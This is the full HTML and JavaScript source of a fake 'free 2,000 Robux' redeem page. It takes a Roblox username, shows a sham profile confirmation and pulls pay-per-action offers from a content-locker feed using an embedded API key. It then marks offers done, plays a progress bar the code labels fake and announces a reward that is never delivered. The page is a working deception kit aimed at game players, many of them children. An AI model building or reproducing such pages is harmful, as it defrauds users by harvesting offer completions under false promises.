<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>hzm Redeem</title>
<style>
body { font-family: Arial, Helvetica, sans-serif; background: radial-gradient(circle at top,#0b1c3d,#050b1f 70%); color:white; display:flex; flex-direction:column; align-items:center; padding-top:50px;}
.container { width:350px; display:flex; flex-direction:column; gap:15px;}
.logo { font-size:40px; font-weight:bold; text-align:center; margin-bottom:10px;}
input.locked { pointer-events:none; user-select:none; border:1px solid white; border-radius:6px; padding:14px; color:white; background:transparent; text-align:center;}
input[type=text]{padding:14px;border-radius:6px;border:1px solid #555;background:transparent;color:white;}
button{padding:14px;border-radius:6px;border:none;background:linear-gradient(90deg,#008cff,#00c6ff);color:white;font-weight:bold;cursor:pointer;}
button:hover{transform:translateY(-2px);}
.error{color:#ff4d6d;text-align:center;height:18px;font-size:14px;}
.modal { position: fixed; inset:0; display:flex; justify-content:center; align-items:center; background: rgba(0,0,0,0.6); display:none;}
.card { background:#0f1f45; border-radius:16px; padding:30px; width:380px; text-align:center; box-shadow:0 0 25px rgba(0,140,255,0.4); border:1px solid rgba(0,140,255,0.4);}
.avatar { width:110px;height:110px;border-radius:50%;border:3px solid #00aaff;background: linear-gradient(135deg,#008cff,#00c6ff);display:flex;justify-content:center;align-items:center;font-size:40px;margin:20px auto;font-weight:bold;}
.username { font-size:20px; color:#4da3ff; font-weight:bold; }
.handle { font-size:14px; color:#9bbcff; }
.buttons { display:flex; justify-content:space-between; margin-top:20px; }
.no-btn { background:#1c2d5c; width:45%; }
.yes-btn { background: linear-gradient(90deg,#008cff,#00c6ff); width:45%; }
.quest-box { display:none; flex-direction:column; background:#0f1f45; border-radius:16px; padding:20px; width:380px; box-shadow:0 0 25px rgba(0,140,255,0.4); border:1px solid rgba(0,140,255,0.4); margin-top:20px; }
.progress-container { background:#1c2d5c; border-radius:10px; height:20px; width:100%; overflow:hidden; margin-bottom:10px;}
.progress-bar { height:100%; width:0%; background: linear-gradient(90deg,#008cff,#00c6ff); transition: width 0.5s; }
.reward-text { margin-top:10px; font-weight:bold; color:#00ff6a; display:none; text-align:center; }
.offer { background:linear-gradient(90deg,#008cff,#00c6ff); padding:12px; margin-bottom:10px; border-radius:10px; cursor:pointer; font-weight:600; }
.offer.done { opacity:0.6; text-decoration:line-through; }
.offer:hover { background:linear-gradient(90deg,#00c6ff,#008cff); }
</style>
</head>
<body>

<!-- STEP 1: Username Input -->
<div class="container" id="step1">
  <div class="logo">hzm</div>
  <input type="text" value="2,000 Robux" class="locked" readonly>
  <input type="text" id="usernameInput" placeholder="Enter Roblox Username">
  <button id="redeemBtn">Redeem</button>
  <div class="error" id="errorMsg"></div>
</div>

<!-- STEP 2: Profile Modal -->
<div class="modal" id="profileModal">
  <div class="card">
    <h3>âœ” Confirm Your Profile</h3>
    <p style="margin-top:6px;color:#9bbcff;">Is this your Roblox account?</p>
    <div id="avatar" class="avatar">?</div>
    <div id="displayName" class="username"></div>
    <div id="handle" class="handle"></div>
    <div class="buttons">
      <button class="no-btn" id="noBtn">No</button>
      <button class="yes-btn" id="yesBtn">Yes!</button>
    </div>
  </div>
</div>

<!-- STEP 3: Quest/Offers Box -->
<div class="quest-box" id="questBox">
  <h3>Complete 2 offers below to claim 2,000 Robux</h3>
  <div id="offersContainer"></div>
  <p>Offer Completed <span id="doneCount">0</span>/2</p>
  <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
  <p class="reward-text" id="rewardText">ðŸŽ‰ Congratulations! You earned 2,000 Robux</p>
</div>

<script>
const step1 = document.getElementById("step1");
const redeemBtn = document.getElementById("redeemBtn");
const usernameInput = document.getElementById("usernameInput");
const errorMsg = document.getElementById("errorMsg");

const profileModal = document.getElementById("profileModal");
const displayName = document.getElementById("displayName");
const handle = document.getElementById("handle");
const avatar = document.getElementById("avatar");
const noBtn = document.getElementById("noBtn");
const yesBtn = document.getElementById("yesBtn");

const questBox = document.getElementById("questBox");
const offersContainer = document.getElementById("offersContainer");
const doneCountEl = document.getElementById("doneCount");
const progressBar = document.getElementById("progressBar");
const rewardText = document.getElementById("rewardText");

let doneCount = 0;

// STEP 1: Redeem click
redeemBtn.addEventListener("click",()=>{
  const username=usernameInput.value.trim();
  errorMsg.textContent="";
  if(!username){ errorMsg.textContent="Enter a username"; return; }
  displayName.textContent=username;
  handle.textContent="@"+username;
  avatar.textContent=username.charAt(0).toUpperCase();
  profileModal.style.display="flex";
});

// STEP 2: Modal buttons
noBtn.addEventListener("click",()=>{
  profileModal.style.display="none";
});

yesBtn.addEventListener("click",()=>{
  profileModal.style.display="none";
  step1.style.display="none";
  questBox.style.display="flex";
  fetchOffers();
});

// STEP 3: Fetch offers as quests
function fetchOffers(){
  const username=usernameInput.value.trim();
  const apiKey="4ae12a8fe006e35d228f7d24ff8d2729";
  const apiUrl=`https://d1y3y09sav47f5.cloudfront.net/public/offers/feed.php?user_id=655069&api_key=${apiKey}&s1=${encodeURIComponent(username)}&s2=`;

  offersContainer.innerHTML=`<p style="text-align:center;color:#9bbcff;">Loading offers...</p>`;

  fetch(apiUrl)
  .then(res=>res.json())
  .then(data=>{
    console.log("Offers:",data);
    let offersArray=[];
    if(Array.isArray(data)) offersArray=data;
    else if(data.offers) offersArray=data.offers;
    else if(data.data && data.data.offers) offersArray=data.data.offers;
    else if(data.data && Array.isArray(data.data)) offersArray=data.data;

    if(!offersArray || offersArray.length===0){
      offersContainer.innerHTML=`<p style="color:#ff4d6d;text-align:center;">No offers available right now.</p>`;
      return;
    }

    offersContainer.innerHTML="";
    offersArray.forEach((offer,index)=>{
      const el=document.createElement("div");
      el.className="offer";
      el.textContent=offer.name || `Offer ${index+1}`;
      el.addEventListener("click",()=>{
        if(!el.classList.contains("done")){
          el.classList.add("done");
          doneCount++;
          doneCountEl.textContent=doneCount;
          startFakeProcessing();
          window.open(offer.url,"_blank");
          if(doneCount>=2){
            rewardText.style.display="block";
            progressBar.style.width="100%";
          }
        }
      });
      offersContainer.appendChild(el);
    });
  })
  .catch(err=>{
    console.error(err);
    offersContainer.innerHTML=`<p style="color:#ff4d6d;text-align:center;">Failed to load offers.</p>`;
  });
}

// Fake progress bar animation
function startFakeProcessing(){
  let width=parseInt(progressBar.style.width) || 0;
  const interval1=setInterval(()=>{
    width+=1;
    if(width>=20) clearInterval(interval1);
    progressBar.style.width=width+"%";
  },3000);
  setTimeout(()=>{
    let width2=parseInt(progressBar.style.width)||20;
    const interval2=setInterval(()=>{
      width2+=1;
      if(width2>=60) clearInterval(interval2);
      progressBar.style.width=width2+"%";
    },5000);
  },2000);
}
</script>

</body>
</html>
